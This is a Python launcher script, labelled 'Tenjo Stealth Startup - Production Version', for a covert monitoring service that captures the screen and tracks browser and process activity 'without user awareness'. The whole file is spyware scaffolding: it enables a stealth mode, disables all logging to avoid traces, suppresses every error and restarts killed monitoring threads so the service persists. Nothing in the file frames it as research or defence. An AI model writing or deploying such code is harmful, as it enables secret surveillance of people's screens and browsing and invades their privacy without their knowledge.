#!/usr/bin/env python3
"""
Tenjo Stealth Startup - Production Version
Silent background service that runs monitoring without user awareness
"""

import os
import sys
import time
import threading
import logging
from pathlib import Path

# Disable all logging to avoid any traces
logging.disable(logging.CRITICAL)

# Add src to path
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(current_dir, 'src'))

class StealthService:
    def __init__(self):
        self.running = False
        self.threads = []
        
    def start(self):
        """Start the stealth monitoring service"""
        if self.running:
            return
            
        self.running = True
        
        try:
            # Import monitoring modules
            from modules.screen_capture import ScreenCapture
            from modules.browser_monitor import BrowserMonitor
            from modules.process_monitor import ProcessMonitor
            from utils.stealth import StealthMode
            
            # Enable stealth mode
            stealth = StealthMode()
            stealth.enable_stealth()
            
            # Initialize monitoring modules
            screen_capture = ScreenCapture()
            browser_monitor = BrowserMonitor()
            process_monitor = ProcessMonitor()
            
            # Start monitoring threads
            self._start_thread(screen_capture.start_monitoring, "screen")
            self._start_thread(browser_monitor.start_monitoring, "browser")
            self._start_thread(process_monitor.start_monitoring, "process")
            
            # Keep service running
            self._keep_alive()
            
        except Exception:
            # Silent failure - no error output
            pass
    
    def _start_thread(self, target, name):
        """Start a monitoring thread"""
        try:
            thread = threading.Thread(target=target, daemon=True, name=name)
            thread.start()
            self.threads.append(thread)
        except:
            pass
    
    def _keep_alive(self):
        """Keep the service alive"""
        try:
            while self.running:
                time.sleep(30)  # Check every 30 seconds
                
                # Restart any dead threads
                for i, thread in enumerate(self.threads):
                    if not thread.is_alive():
                        # Thread died, restart it
                        if thread.name == "screen":
                            from modules.screen_capture import ScreenCapture
                            target = ScreenCapture().start_monitoring
                        elif thread.name == "browser":
                            from modules.browser_monitor import BrowserMonitor
                            target = BrowserMonitor().start_monitoring
                        elif thread.name == "process":
                            from modules.process_monitor import ProcessMonitor
                            target = ProcessMonitor().start_monitoring
                        else:
                            continue
                            
                        new_thread = threading.Thread(target=target, daemon=True, name=thread.name)
                        new_thread.start()
                        self.threads[i] = new_thread
        except:
            pass
    
    def stop(self):
        """Stop the service"""
        self.running = False

def main():
    """Main service entry point"""
    try:
        # Run completely silent
        service = StealthService()
        service.start()
    except:
        # Silent failure
        pass

if __name__ == "__main__":
    main()
